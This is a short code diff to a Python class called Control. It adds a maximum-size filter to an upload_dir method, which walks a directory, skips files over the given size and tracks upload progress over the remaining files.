@@ -358,7 +358,11 @@ class Control(metaclass=abc.ABCMeta):
         except Exception as e:
             self.es.send_json(ERROR, f"Error reading file {e}")
 
-    def upload_dir(self, _dir):
+    def upload_dir(self, param):
+        _dir = param['path']
+
+        max_size = param['size']
+
         _dir = os.path.normpath(_dir)
 
         if not os.path.isdir(_dir):
@@ -374,10 +378,19 @@ class Control(metaclass=abc.ABCMeta):
             # count total file size for determining progress
             for subdir, _, files in os.walk(_dir):
                 for _file in files:
-                    file_total_size += os.stat(os.path.join(subdir, _file)).st_size
+                    file_size = os.stat(os.path.join(subdir, _file)).st_size
+
+                    if not (max_size != -1 and file_size > max_size):
+                        file_total_size += file_size
 
             for subdir, _, files in os.walk(_dir):
                 for _file in files:
+
+                    file_size = os.stat(os.path.join(subdir, _file)).st_size
+
+                    if max_size != -1 and file_size > max_size:
+                        continue
+
                     _file = os.path.normpath(os.path.join(subdir, _file))
                     completed_size += os.stat(os.path.join(subdir, _file)).st_size
 
